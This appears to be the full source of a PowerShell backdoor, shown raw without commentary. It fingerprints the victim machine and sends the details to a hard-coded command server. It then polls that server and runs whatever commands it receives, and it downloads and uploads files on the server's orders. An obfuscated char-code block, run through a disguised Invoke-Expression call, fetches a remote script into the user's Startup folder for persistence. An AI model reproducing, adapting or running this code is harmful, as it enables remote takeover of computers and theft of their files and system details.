$hostname = $env:COMPUTERNAME;
$whoami = $env:USERNAME;
$arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$os = (Get-WmiObject -class Win32_OperatingSystem).Caption;
$domain = (Get-WmiObject Win32_ComputerSystem).Domain;
$IP = (gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
$random = -join ((65 .. 90) | Get-Random -Count 5 | % { [char]$_ });
$agent = "$random-img.jpeg"
$finaldata = "[ $os ]**[ $IP ]**[ $arch ]**[ $hostname ]**[ $domain ]**[ $whoami ]"
$h3 = new-object net.WebClient
$h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
$h = $h3.UploadString("http://194.127.179.111:8787/info/$agent", "data="+$finaldata)
$h2 = New-Object system.Net.WebClient;
$h3 = New-Object system.Net.WebClient;



function FuckYou_MalwareHunterTeam
{
    $ASDASDASDASDASDANSDJSNDANSDOKNASDNALASDASADSD=@(102,117,110,99,116,105,111,110,32,75,97,115,112,101,114,115,107,121,73,110,116,101,114,110,101,116,83,101,99,117,114,105,116,121,13,10,123,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,61,91,65,112,112,68,111,109,97,105,110,93,58,58,67,114,101,97,116,101,68,111,109,97,105,110,40,39,84,114,117,115,116,101,100,32,65,112,112,100,111,109,97,105,110,39,44,36,110,117,108,108,44,91,65,112,112,68,111,109,97,105,110,93,58,58,67,117,114,114,101,110,116,68,111,109,97,105,110,58,58,83,101,116,117,112,73,110,102,111,114,109,97,116,105,111,110,58,58,65,112,112,108,105,99,97,116,105,111,110,66,97,115,101,41,59,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,46,80,101,114,109,105,115,115,105,111,110,83,101,116,46,73,115,85,110,114,101,115,116,114,105,99,116,101,100,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,46,83,101,116,67,97,99,104,101,80,97,116,104,40,39,67,58,92,85,115,101,114,115,92,80,117,98,108,105,99,39,41,59,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,46,65,112,112,101,110,100,80,114,105,118,97,116,101,80,97,116,104,40,39,67,58,92,85,115,101,114,115,92,80,117,98,108,105,99,39,41,59,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,32,61,32,39,67,58,92,85,115,101,114,115,92,39,32,43,32,36,101,110,118,58,85,115,101,114,78,97,109,101,32,43,32,39,92,65,112,112,68,97,116,97,92,82,111,97,109,105,110,103,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,83,116,97,114,116,32,77,101,110,117,92,80,114,111,103,114,97,109,115,92,83,116,97,114,116,117,112,92,39,13,10,32,32,32,32,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,70,105,108,101,40,39,104,116,116,112,58,47,47,119,119,119,46,109,57,99,46,110,101,116,47,117,112,108,111,97,100,115,47,49,53,56,55,51,51,49,51,50,51,49,46,106,112,103,39,44,32,36,77,97,108,119,97,114,101,98,121,116,101,115,32,43,32,39,83,121,110,99,65,112,112,118,80,117,98,108,105,115,104,105,110,103,83,101,114,118,101,114,46,118,98,115,39,41,13,10,32,32,32,32,73,110,118,111,107,101,45,73,116,101,109,32,34,67,58,92,85,115,101,114,115,92,36,101,110,118,58,85,115,101,114,78,97,109,101,92,65,112,112,68,97,116,97,92,82,111,97,109,105,110,103,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,83,116,97,114,116,32,77,101,110,117,92,80,114,111,103,114,97,109,115,92,83,116,97,114,116,117,112,92,83,121,110,99,65,112,112,118,80,117,98,108,105,115,104,105,110,103,83,101,114,118,101,114,46,118,98,115,34,13,10,125,13,10,75,97,115,112,101,114,115,107,121,73,110,116,101,114,110,101,116,83,101,99,117,114,105,116,121);[System.Text.Encoding]::ASCII.GetString($ASDASDASDASDASDANSDJSNDANSDOKNASDNALASDASADSD)|I`E`X
}

FuckYou_MalwareHunterTeam





function load($module)
{



    $handle = new-object net.WebClient;
    $handleh = $handle.Headers;
    $handleh.add("Content-Type", "application/x-www-form-urlencoded");
    $modulecontent = $handle.UploadString("http://194.127.179.111:8787/md/$agent", "data="+"$module");



    return $modulecontent
}





function Download($file)
{



    $handle = new-object net.WebClient;
    $handleh = $handle.Headers;
    $handleh.add("Content-Type", "application/x-www-form-urlencoded");
    $modulecontent = $handle.UploadString("http://194.127.179.111:8787/up/$agent", "data="+"$file");
    return $modulecontent
}





function upload($file)
{



    $handle = new-object net.WebClient;
    $handleh = $handle.Headers;
    $handleh.add("Content-Type", "application/x-www-form-urlencoded");
    $modulecontent = $handle.UploadString("http://194.127.179.111:8787/img/$agent", "data="+"$file");
    return $modulecontent
}





while ($true)
{
    $cmd = $h2.downloadString("http://194.127.179.111:8787/cm/$agent");
    #echo $cmd
    if ($cmd -eq "REGISTER")
    {
        $h3 = new-object net.WebClient
        $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
        $h3.UploadString("http://194.127.179.111:8787/info/$agent", "data="+$finaldata)
        continue
    }
    if ($cmd -eq "")
    {
        sleep 2
        continue
    }
    elseif ($cmd.split(" ")[0] -eq "load")
    {
        $f = $cmd.split(" ")[1]
        $module = load -module $f
        try
        {
            $output = Invoke-Expression ($module) | Out-String
        }
        catch
        {
            $output = $Error[0] | Out-String;
        }
    }
    elseif ($cmd.split(" ")[0] -eq "download")
    {
        try
        {
            $file = $cmd.split(" ")[1]
            echo $file
            $path = $cmd.split(" ")[2]
            echo $path
            $filedata=Download -file $file
            $bytes = [Convert]::FromBase64String($filedata)
            [IO.File]::WriteAllBytes($path, $bytes)
            $output="download file to $path"
        }
        catch
        {
            $output = "err download file"
        }
    }
    elseif ($cmd.split(" ")[0] -eq "upload")
    {
        try
        {
            $path = $cmd.split(" ")[1]
            #echo $file
            $filedata=[IO.File]::ReadAllBytes($path)
            $bytes = [Convert]::ToBase64String($filedata)
            echo $bytes
            $output=upload -file $bytes
        }
        catch
        {
            $output = "err upload file"
        }
    }
    else
    {

        try
        {
            $output = Invoke-Expression ($cmd) | Out-String
        }
        catch
        {
            #$output = $Error[0] | Out-String;
        }
    }
    #Echo $output
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
    $redata = [System.Convert]::ToBase64String($bytes)
    $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
    $re = $h3.UploadString("http://194.127.179.111:8787/re/$agent", "data="+$redata);
}